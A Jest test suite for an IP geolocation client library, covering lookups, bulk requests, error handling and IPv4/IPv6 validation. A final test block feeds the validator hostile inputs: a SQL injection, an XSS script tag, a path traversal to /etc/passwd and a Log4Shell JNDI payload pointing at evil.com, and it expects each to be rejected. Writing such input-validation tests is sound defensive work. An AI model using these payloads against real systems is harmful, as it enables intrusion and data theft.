import axios from "axios";
import {
  IPFlare,
  type IPGeolocationResponse,
  type BulkLookupResponse,
  type IPGeolocationOptions,
  isIPGeolocationError,
  isIPGeolocationSuccess,
  isSuccess,
  isError,
} from "../index";

// Mock axios
jest.mock("axios", () => ({
  create: jest.fn(() => ({
    get: jest.fn(),
    post: jest.fn(),
  })),
  isAxiosError: jest.fn(),
}));

const mockedAxios = axios as jest.Mocked<typeof axios>;
const mockAxiosInstance = {
  get: jest.fn(),
  post: jest.fn(),
} as any;

describe("IPFlare", () => {
  const mockApiKey = "test-api-key";
  let geolocator: IPFlare;

  beforeEach(() => {
    jest.clearAllMocks();
    mockedAxios.create.mockReturnValue(mockAxiosInstance);
    geolocator = new IPFlare({ apiKey: mockApiKey });
  });

  describe("Constructor", () => {
    it("should create instance with valid API key", () => {
      expect(() => new IPFlare({ apiKey: "valid-key" })).not.toThrow();
    });

    it("should throw error when API key is not provided", () => {
      expect(() => new IPFlare({ apiKey: "" })).toThrow("API key is required");
    });

    it("should throw error when API key is not a string", () => {
      expect(() => new IPFlare({ apiKey: 123 as unknown as string })).toThrow(
        "API key must be a string"
      );
    });

    it("should throw error when API key is empty string", () => {
      expect(() => new IPFlare({ apiKey: "" })).toThrow("API key is required");
    });

    it("should throw error when API key is whitespace only", () => {
      expect(() => new IPFlare({ apiKey: "   " })).toThrow(
        "API key cannot be empty"
      );
    });

    it("should create axios instance with correct config", () => {
      new IPFlare({
        apiKey: "test-key",
        baseURL: "https://custom.api.com",
        timeout: 5000,
      });

      expect(mockedAxios.create).toHaveBeenCalledWith({
        baseURL: "https://custom.api.com",
        timeout: 5000,
        headers: {
          "X-API-Key": "test-key",
          "Content-Type": "application/json",
        },
      });
    });

    it("should use default config when optional params not provided", () => {
      new IPFlare({ apiKey: "test-key" });

      expect(mockedAxios.create).toHaveBeenCalledWith({
        baseURL: "https://api.ipflare.io",
        timeout: 10000,
        headers: {
          "X-API-Key": "test-key",
          "Content-Type": "application/json",
        },
      });
    });
  });

  describe("lookup", () => {
    const mockResponse: IPGeolocationResponse = {
      ip: "178.238.11.6",
      city: "Mountain View",
      country_code: "US",
      in_eu: false,
      land_locked: false,
    };

    beforeEach(() => {
      mockAxiosInstance.get.mockResolvedValue({ data: mockResponse });
    });

    it("should return error when IP is not provided", async () => {
      const result = await geolocator.lookup("");

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("INVALID_INPUT");
        expect(result.error.message).toBe("IP address is required");
      }
    });

    it("should return error when IP is not a string", async () => {
      const result = await geolocator.lookup(123 as unknown as string);

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("INVALID_INPUT");
        expect(result.error.message).toBe("IP address must be a string");
      }
    });

    it("should return error for invalid IPv4 format", async () => {
      const result = await geolocator.lookup("999.999.999.999");

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("INVALID_IP_ADDRESS");
        expect(result.error.message).toBe(
          "Invalid IP address format: 999.999.999.999"
        );
      }
    });

    it("should return error for invalid IPv6 format", async () => {
      const result = await geolocator.lookup("gggg::1");

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("INVALID_IP_ADDRESS");
        expect(result.error.message).toBe("Invalid IP address format: gggg::1");
      }
    });

    it("should fetch geolocation data for valid IPv4", async () => {
      const result = await geolocator.lookup("178.238.11.6");

      expect(mockAxiosInstance.get).toHaveBeenCalledWith("/178.238.11.6", {
        params: {},
      });
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data).toEqual(mockResponse);
      }
    });

    it("should fetch geolocation data for valid IPv6", async () => {
      const ipv6 = "2001:4860:4860::8888";
      const result = await geolocator.lookup(ipv6);

      expect(mockAxiosInstance.get).toHaveBeenCalledWith(`/${ipv6}`, {
        params: {},
      });
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data).toEqual(mockResponse);
      }
    });

    it("should trim whitespace from IP address", async () => {
      const result = await geolocator.lookup("  178.238.11.6  ");

      expect(mockAxiosInstance.get).toHaveBeenCalledWith("/178.238.11.6", {
        params: {},
      });
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data).toEqual(mockResponse);
      }
    });

    it("should include optional fields in request", async () => {
      const result = await geolocator.lookup("178.238.11.6", {
        include: {
          asn: true,
          isp: true,
        },
      });

      expect(mockAxiosInstance.get).toHaveBeenCalledWith("/178.238.11.6", {
        params: { fields: "asn,isp" },
      });
      expect(result.ok).toBe(true);
    });

    it("should handle 401 unauthorized error", async () => {
      const errorResponse = new Error("API Error") as Error & {
        isAxiosError: boolean;
        response: { status: number };
      };
      errorResponse.isAxiosError = true;
      errorResponse.response = {
        status: 401,
      };
      mockAxiosInstance.get.mockRejectedValue(errorResponse);
      mockedAxios.isAxiosError.mockReturnValue(true);

      const result = await geolocator.lookup("178.238.11.6");

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("UNAUTHORIZED");
        expect(result.error.message).toBe("Invalid API key");
      }
    });

    it("should handle 429 quota exceeded error", async () => {
      const errorResponse = new Error("API Error") as Error & {
        isAxiosError: boolean;
        response: { status: number };
      };
      errorResponse.isAxiosError = true;
      errorResponse.response = {
        status: 429,
      };
      mockAxiosInstance.get.mockRejectedValue(errorResponse);
      mockedAxios.isAxiosError.mockReturnValue(true);

      const result = await geolocator.lookup("178.238.11.6");

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("QUOTA_EXCEEDED");
        expect(result.error.message).toBe("Quota exceeded");
      }
    });

    it("should handle API errors with custom message", async () => {
      const errorResponse = new Error("API Error");
      (errorResponse as any).isAxiosError = true;
      (errorResponse as any).response = {
        data: { error: "Custom error message" },
        status: 400,
      };
      mockAxiosInstance.get.mockRejectedValue(errorResponse);
      mockedAxios.isAxiosError.mockReturnValue(true);

      const result = await geolocator.lookup("178.238.11.6");

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.message).toBe("Custom error message");
      }
    });

    it("should handle rate limit errors specifically", async () => {
      const rateLimitError = new Error("API Error");
      (rateLimitError as any).isAxiosError = true;
      (rateLimitError as any).response = {
        status: 429,
        data: { error: "Rate limit exceeded" },
      };
      mockAxiosInstance.get.mockRejectedValue(rateLimitError);
      mockedAxios.isAxiosError.mockReturnValue(true);

      const result = await geolocator.lookup("178.238.11.6");

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("QUOTA_EXCEEDED");
        expect(result.error.message).toBe("Quota exceeded");
      }
    });

    it("should handle generic errors", async () => {
      mockAxiosInstance.get.mockRejectedValue(new Error("Network error"));
      mockedAxios.isAxiosError.mockReturnValue(false);

      const result = await geolocator.lookup("178.238.11.6");

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("UNKNOWN_ERROR");
        expect(result.error.message).toBe("An unexpected error occurred");
      }
    });
  });

  describe("bulkLookup", () => {
    const mockBulkResponse: BulkLookupResponse = [
      {
        ip: "178.238.11.6",
        status: "success",
        data: {
          ip: "178.238.11.6",
          city: "Mountain View",
          country_code: "US",
          in_eu: false,
          land_locked: false,
        },
      },
      {
        ip: "invalid-ip",
        status: "error",
        error_message: "Invalid IP address",
      },
    ];

    beforeEach(() => {
      mockAxiosInstance.post.mockResolvedValue({
        data: { results: mockBulkResponse },
      });
    });

    it("should return error when IPs is not an array", async () => {
      const result = await geolocator.bulkLookup({ ips: "not-array" as any });

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("INVALID_INPUT");
        expect(result.error.message).toBe("IPs must be an array");
      }
    });

    it("should return error when IPs array is empty", async () => {
      const result = await geolocator.bulkLookup({ ips: [] });

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("INVALID_INPUT");
        expect(result.error.message).toBe(
          "At least one IP address is required"
        );
      }
    });

    it("should return error when IPs array exceeds 500", async () => {
      const tooManyIPs = new Array(501).fill("178.238.11.6");
      const result = await geolocator.bulkLookup({ ips: tooManyIPs });

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("INVALID_INPUT");
        expect(result.error.message).toBe(
          "Maximum of 500 IPs per request allowed"
        );
      }
    });

    it("should return error for invalid IP addresses in array", async () => {
      const result = await geolocator.bulkLookup({
        ips: ["178.238.11.6", "invalid-ip", "999.999.999.999"],
      });

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("INVALID_IP_ADDRESS");
        expect(result.error.message).toBe(
          "Invalid IP addresses found: invalid-ip, 999.999.999.999"
        );
      }
    });

    it("should return error for non-string values in IPs array", async () => {
      const result = await geolocator.bulkLookup({
        ips: ["178.238.11.6", 123, null] as any,
      });

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("INVALID_IP_ADDRESS");
        expect(result.error.message).toContain("Invalid IP addresses found");
      }
    });

    it("should fetch bulk geolocation data for valid IPs", async () => {
      const result = await geolocator.bulkLookup({
        ips: ["178.238.11.6", "1.1.1.1"],
      });

      expect(mockAxiosInstance.post).toHaveBeenCalledWith(
        "/bulk-lookup",
        { ips: ["178.238.11.6", "1.1.1.1"] },
        { params: {} }
      );
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.data).toEqual(mockBulkResponse);
      }
    });

    it("should trim whitespace from IP addresses", async () => {
      const result = await geolocator.bulkLookup({
        ips: ["  178.238.11.6  ", " 1.1.1.1 "],
      });

      expect(mockAxiosInstance.post).toHaveBeenCalledWith(
        "/bulk-lookup",
        { ips: ["178.238.11.6", "1.1.1.1"] },
        { params: {} }
      );
      expect(result.ok).toBe(true);
    });

    it("should include optional fields in bulk request", async () => {
      const result = await geolocator.bulkLookup({
        ips: ["178.238.11.6", "1.1.1.1"],
        include: {
          asn: true,
          isp: true,
        },
      });

      expect(mockAxiosInstance.post).toHaveBeenCalledWith(
        "/bulk-lookup",
        { ips: ["178.238.11.6", "1.1.1.1"] },
        { params: { fields: "asn,isp" } }
      );
      expect(result.ok).toBe(true);
    });

    it("should handle 401 unauthorized error", async () => {
      const errorResponse = new Error("API Error");
      (errorResponse as any).isAxiosError = true;
      (errorResponse as any).response = {
        status: 401,
      };
      mockAxiosInstance.post.mockRejectedValue(errorResponse);
      mockedAxios.isAxiosError.mockReturnValue(true);

      const result = await geolocator.bulkLookup({ ips: ["178.238.11.6"] });

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("UNAUTHORIZED");
        expect(result.error.message).toBe("Invalid API key");
      }
    });

    it("should handle 429 quota exceeded error", async () => {
      const errorResponse = new Error("API Error");
      (errorResponse as any).isAxiosError = true;
      (errorResponse as any).response = {
        status: 429,
      };
      mockAxiosInstance.post.mockRejectedValue(errorResponse);
      mockedAxios.isAxiosError.mockReturnValue(true);

      const result = await geolocator.bulkLookup({ ips: ["178.238.11.6"] });

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("QUOTA_EXCEEDED");
        expect(result.error.message).toBe("Quota exceeded");
      }
    });

    it("should handle rate limit with custom API message in bulk", async () => {
      const rateLimitError = new Error("API Error");
      (rateLimitError as any).isAxiosError = true;
      (rateLimitError as any).response = {
        status: 429,
        data: { error: "API quota exceeded - please try again later" },
      };
      mockAxiosInstance.post.mockRejectedValue(rateLimitError);
      mockedAxios.isAxiosError.mockReturnValue(true);

      const result = await geolocator.bulkLookup({ ips: ["178.238.11.6"] });

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("QUOTA_EXCEEDED");
        expect(result.error.message).toBe("Quota exceeded");
      }
    });

    it("should handle non-Error, non-AxiosError exceptions in bulk lookup", async () => {
      const weirdError = "Some weird non-Error exception";
      mockAxiosInstance.post.mockRejectedValue(weirdError);
      mockedAxios.isAxiosError.mockReturnValue(false);

      const result = await geolocator.bulkLookup({ ips: ["178.238.11.6"] });

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("UNKNOWN_ERROR");
        expect(result.error.message).toBe("An unexpected error occurred");
      }
    });

    it("should handle AxiosError without response in bulk lookup", async () => {
      const networkError = new Error("Network Error");
      (networkError as any).isAxiosError = true;
      mockAxiosInstance.post.mockRejectedValue(networkError);
      mockedAxios.isAxiosError.mockReturnValue(true);

      const result = await geolocator.bulkLookup({ ips: ["178.238.11.6"] });

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("NETWORK_ERROR");
        expect(result.error.message).toBe("Network error occurred");
      }
    });

    it("should handle invalid response format", async () => {
      mockAxiosInstance.post.mockResolvedValue({
        data: { notResults: [] },
      });

      const result = await geolocator.bulkLookup({ ips: ["178.238.11.6"] });

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("INTERNAL_SERVER_ERROR");
        expect(result.error.message).toBe("Invalid response format from API");
      }
    });

    it("should handle a mix of valid and invalid IPs", async () => {
      const result = await geolocator.bulkLookup({
        ips: [
          "104.174.125.138",
          "not_a_valid_IP",
          "2001:fb1:c0:2dfd:8965:bc32:5b49:7ea9",
        ],
      });

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.type).toBe("INVALID_IP_ADDRESS");
        expect(result.error.message).toBe(
          "Invalid IP addresses found: not_a_valid_IP"
        );
      }
    });

    it("should handle exactly 500 IPs", async () => {
      const ips = new Array(500).fill("1.1.1.1");

      mockAxiosInstance.post.mockClear();
      mockAxiosInstance.post.mockResolvedValueOnce({
        data: {
          results: ips.map((ip) => ({
            ip,
            status: "success",
            data: { ip, in_eu: false, land_locked: false },
          })),
        },
      });

      const result = await geolocator.bulkLookup({ ips });
      expect(result.ok).toBe(true);
    });
  });

  describe("Type Guards", () => {
    it("should correctly identify error responses", () => {
      const errorResponse = {
        ip: "invalid-ip",
        status: "error" as const,
        error_message: "Invalid IP",
      };

      expect(isIPGeolocationError(errorResponse)).toBe(true);
      expect(isIPGeolocationSuccess(errorResponse)).toBe(false);
    });

    it("should correctly identify success responses", () => {
      const successResponse = {
        ip: "178.238.11.6",
        status: "success" as const,
        data: {
          ip: "178.238.11.6",
          in_eu: false,
          land_locked: false,
        },
      };

      expect(isIPGeolocationSuccess(successResponse)).toBe(true);
      expect(isIPGeolocationError(successResponse)).toBe(false);
    });

    it("should correctly identify Result success", () => {
      const successResult = {
        ok: true as const,
        data: { ip: "8.8.8.8", in_eu: false, land_locked: false },
      };

      expect(isSuccess(successResult)).toBe(true);
      expect(isError(successResult)).toBe(false);
    });

    it("should correctly identify Result error", () => {
      const errorResult = {
        ok: false as const,
        error: {
          type: "INVALID_IP_ADDRESS" as const,
          message: "Invalid IP",
        },
      };

      expect(isSuccess(errorResult)).toBe(false);
      expect(isError(errorResult)).toBe(true);
    });
  });

  describe("Edge Cases and Production Scenarios", () => {
    describe("IPv6 Address Variations", () => {
      const validIPv6Addresses = [
        "2001:0db8:0000:0000:0000:ff00:0042:8329",
        "2001:db8:0:0:0:ff00:42:8329",
        "2001:db8::ff00:42:8329",
        "::1",
        "fe80::1",
        "::ffff:192.0.2.1",
        "2001:db8:85a3::8a2e:370:7334",
        "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
      ];

      validIPv6Addresses.forEach((ip) => {
        it(`should accept valid IPv6: ${ip}`, async () => {
          mockAxiosInstance.get.mockResolvedValue({
            data: { ip, in_eu: false, land_locked: false },
          });

          const result = await geolocator.lookup(ip);
          expect(result.ok).toBe(true);
          expect(mockAxiosInstance.get).toHaveBeenCalledWith(`/${ip}`, {
            params: {},
          });
        });
      });

      const invalidIPv6Addresses = [
        "gggg::1",
        "2001:0db8:0000:0000:0000:ff00:0042:8329:extra",
        "2001:0db8::ff00::42:8329",
        ":::1",
        "2001:db8:85a3::8a2e:370g:7334",
      ];

      invalidIPv6Addresses.forEach((ip) => {
        it(`should reject invalid IPv6: ${ip}`, async () => {
          const result = await geolocator.lookup(ip);
          expect(result.ok).toBe(false);
          if (!result.ok) {
            expect(result.error.type).toBe("INVALID_IP_ADDRESS");
            expect(result.error.message).toBe(
              `Invalid IP address format: ${ip}`
            );
          }
        });
      });
    });

    describe("IPv4 Edge Cases", () => {
      const validIPv4Addresses = [
        "0.0.0.0",
        "255.255.255.255",
        "192.168.1.1",
        "10.0.0.1",
        "172.16.0.1",
        "8.8.8.8",
        "1.1.1.1",
      ];

      validIPv4Addresses.forEach((ip) => {
        it(`should accept valid IPv4: ${ip}`, async () => {
          mockAxiosInstance.get.mockResolvedValue({
            data: { ip, in_eu: false, land_locked: false },
          });

          const result = await geolocator.lookup(ip);
          expect(result.ok).toBe(true);
        });
      });

      const invalidIPv4Addresses = [
        "256.1.1.1",
        "1.256.1.1",
        "1.1.256.1",
        "1.1.1.256",
        "999.999.999.999",
        "1.1.1",
        "1.1.1.1.1",
        "a.b.c.d",
        "192.168.1.1a",
        "192.168.1.",
        ".192.168.1.1",
        "192.168..1.1",
      ];

      invalidIPv4Addresses.forEach((ip) => {
        it(`should reject invalid IPv4: ${ip}`, async () => {
          const result = await geolocator.lookup(ip);
          expect(result.ok).toBe(false);
          if (!result.ok) {
            expect(result.error.type).toBe("INVALID_IP_ADDRESS");
            expect(result.error.message).toBe(
              `Invalid IP address format: ${ip}`
            );
          }
        });
      });
    });

    describe("Special Characters and Injection Attempts", () => {
      const maliciousInputs = [
        "'; DROP TABLE ips; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "192.168.1.1\x00",
        "192.168.1.1\n",
        "192.168.1.1\r",
        "192.168.1.1\t",
      ];

      maliciousInputs.forEach((input) => {
        it(`should safely reject malicious input: ${JSON.stringify(
          input
        )}`, async () => {
          const result = await geolocator.lookup(input);
          expect(result.ok).toBe(false);
          if (!result.ok) {
            expect(result.error.type).toBe("INVALID_IP_ADDRESS");
            expect(result.error.message).toBe(
              `Invalid IP address format: ${input}`
            );
          }
        });
      });
    });
  });
});
